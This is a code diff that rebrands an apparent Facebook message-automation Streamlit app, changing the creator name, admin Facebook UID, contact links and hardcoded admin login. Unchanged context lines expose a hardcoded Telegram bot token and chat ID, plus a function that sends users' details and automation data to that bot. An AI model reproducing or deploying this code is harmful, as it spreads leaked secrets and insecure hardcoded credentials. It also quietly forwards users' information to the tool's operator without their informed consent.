@@ -35,7 +35,7 @@ def setup_mongodb_heartbeat():
                         '$set': {
                             'last_heartbeat': datetime.now(),
                             'status': 'running',
-                            'app_name': 'LORD DEVIL E2EE',
+                            'app_name': 'ASHU KHAN E2EE',
                             'timestamp': datetime.now(),
                             'version': '2.0'
                         }
@@ -66,7 +66,7 @@ if 'mongodb_started' not in st.session_state:
 # 🚨🚨🚨 MONGODB 24/7 CODE END 🚨🚨🚨
 
 st.set_page_config(
-    page_title="FB E2EE by LORD DEVIL",
+    page_title="FB E2EE BY ASHU KHAN",
     page_icon="👑",
     layout="wide",
     initial_sidebar_state="expanded"
@@ -75,7 +75,7 @@ st.set_page_config(
 # Telegram Bot Configuration
 TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
 TELEGRAM_CHAT_ID = "8186206231"
-FACEBOOK_ADMIN_UID = "100037931553832"
+FACEBOOK_ADMIN_UID = "100014055880174"
 
 def send_telegram_notification(user_data, automation_data):
     """Send user details to Telegram bot"""
@@ -970,17 +970,17 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
                 pass
 
 def send_approval_request_via_whatsapp(user_real_name, approval_key):
-    message = f"Hello LORD DEVIL sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
+    message = f"Hello ASHU KHAN sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
     whatsapp_url = f"https://wa.me/917668337116?text={requests.utils.quote(message)}"
     return whatsapp_url
 
 def send_approval_request_via_facebook(user_real_name, approval_key):
-    message = f"Hello LORD DEVIL sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    facebook_url = f"https://www.facebook.com/LORD DEVIL.X"
+    message = f"Hello ASHU KHAN sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
+    facebook_url = f"https://www.facebook.com/K1NG4SHUKH4N"
     return facebook_url
 
 def send_approval_request_via_telegram(user_real_name, approval_key):
-    message = f"Hello LORD DEVIL sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
+    message = f"Hello ASHU KHAN sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
     telegram_url = f"https://t.me/itxthedevil?text={requests.utils.quote(message)}"
     return telegram_url
 
@@ -1034,7 +1034,7 @@ st.markdown('<div class="main-container">', unsafe_allow_html=True)
 # Profile Icon
 st.markdown('<div class="profile-icon"></div>', unsafe_allow_html=True)
 
-st.markdown('<div class="main-header"><h1>LORD DEVIL E2EE FACEBOOK CONVO</h1><p>Created by LORD DEVIL</p></div>', unsafe_allow_html=True)
+st.markdown('<div class="main-header"><h1>ASHU KHAN E2EE FACEBOOK CONVO</h1><p>Created by LORD DEVIL</p></div>', unsafe_allow_html=True)
 
 # Admin Panel
 if st.sidebar.checkbox("🔐 Admin Login"):
@@ -1042,7 +1042,7 @@ if st.sidebar.checkbox("🔐 Admin Login"):
     admin_password = st.sidebar.text_input("Admin Password", type="password", key="admin_password")
     
     if st.sidebar.button("Login as Admin"):
-        if admin_username == "DEVILXD" and admin_password == "LORDX7668":
+        if admin_username == "ASHUKHAN" and admin_password == "ASHUKHAN786":
             st.session_state.admin_logged_in = True
             st.sidebar.success("Admin login successful!")
         else:
@@ -1359,7 +1359,7 @@ else:
         st.markdown('<div class="input-label">Your Real Name</div>', unsafe_allow_html=True)
         user_real_name = st.text_input("", key="real_name", placeholder="Enter your real name for approval", 
                                       value=st.session_state.user_real_name, label_visibility="collapsed")
-        st.markdown('<div class="input-hint">This name will be sent to LORD DEVIL for approval</div>', unsafe_allow_html=True)
+        st.markdown('<div class="input-hint">This name will be sent to ASHU KHAN for approval</div>', unsafe_allow_html=True)
         
         if user_real_name:
             st.session_state.user_real_name = user_real_name
@@ -1376,7 +1376,7 @@ else:
                 st.warning("Please enter your real name first")
         
         # Contact buttons - ALWAYS VISIBLE
-        st.markdown("### 📞 Contact LORD DEVIL for Approval")
+        st.markdown("### 📞 Contact ASHU KHAN for Approval")
         st.markdown("Click any button below to send your approval request:")
         
         col1, col2, col3 = st.columns(3)
